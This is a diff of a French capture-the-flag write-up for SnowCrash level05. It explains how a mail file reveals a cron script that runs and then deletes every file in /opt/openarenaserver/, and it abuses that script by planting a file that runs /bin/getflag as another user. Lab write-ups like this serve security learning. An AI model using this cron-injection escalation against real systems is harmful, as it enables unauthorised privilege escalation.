@@ -1,4 +1,8 @@
-On remarque le message "You have new mail.", ce qui peut indiquer une information intéressante envoyée par le système. On inspecte les variables d’environnement avec `env`
+En se connectant, on remarque le message `You have new mail.`.
+
+Ce qui peut indiquer une information intéressante envoyée par le système.
+
+On inspecte les variables d’environnement avec `env`.
 
 ```bash
 You have new mail.
@@ -7,6 +11,13 @@ level05@SnowCrash:~$ env
 ...
 MAIL=/var/mail/level05
 ...
+```
+
+Ce chemin mène à un fichier dont on peut lire le contenu.
+
+```bash
+level05@SnowCrash:~$ ls -l /var/mail/level05
+-rw-r--r--+ 1 root mail 58 Mar 12  2016 /var/mail/level05
 ```
 
 En lisant le contenu de ce fichier, on découvre une tâche cron :
@@ -27,8 +38,11 @@ for i in /opt/openarenaserver/* ; do
 	rm -f "$i"
 done
 ```
+
 Le script parcourt tous les fichiers dans `/opt/openarenaserver/`, les exécute avec bash dans un environnement restreint (limité à 5 secondes CPU via `ulimit`), puis les supprime.
 
-Exploitation du script avec getflag
+Exploitation du script avec getflag :
 
-`echo "/bin/getflag > /tmp/result" > /opt/openarenaserver/test`
+`echo "/bin/getflag | wall" > /opt/openarenaserver/exploit`
+
+Puisqu'il n'y a aucun filtrage sur ce qui est exécuté, on peut faire ce qu'on veut en tant qu'utilisateur **level05**.
